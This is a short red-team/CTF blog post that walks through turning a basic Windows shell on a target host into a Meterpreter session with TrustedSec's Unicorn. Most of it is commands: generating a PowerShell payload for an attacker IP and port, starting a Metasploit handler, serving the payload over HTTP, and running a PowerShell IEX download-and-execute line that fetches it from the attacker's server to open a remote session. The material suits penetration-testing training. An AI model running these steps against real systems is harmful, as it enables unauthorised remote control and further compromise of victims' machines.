---
layout: post
title:  "Convert Normal Shell Into Meterpreter Shell Using Unicorn (By TrustedSec)"
date:   2020-03-1 05:14:34 +0530
categories: redteam ctf
---

When I'm doing pentesting the first thing I do when get a normal shell in windows is getiing the meterpreter shell. Meterpreter shell is way more easier to work with
and have advanced capebilities like searching privilage escallation possibilities, etc...

In this post I'm discussing about how to convert normal shell into meterpreter shell. To do this task I'm using a tool called 
[Unicorn](https://github.com/trustedsec/unicorn) developed by TrustedSec.
This tool is very handy when you have a firewall in the other end.

In this example I have a normal shell access to the host 10.10.10.11


## Generate payload using unicorn.py
```
python unicorn.py <attacker-ip> <attacker-port>
```

The tool generates two files 
1. unicorn.rc.
2. powershell_attack.txt.

## Run the unicorn rc with metesploit
```
msfconsole -r unicorn.rc
```

## Edit the powershell attack file to remove everything except the payload within double quotes.


## Run SimpleHTTPServer
```
python -m SimpleHTTPServer
```

## Download and execute the hosted file using powershell
```
powershell "IEX(New-Object Net.WebClient).downloadString('http://<attacker-ip>:8000/attack.html')"
```

If everything is done properly now you can see the attack.html page is requested by the victim,


and finally in the msfconsole you should see the meterpreter session.
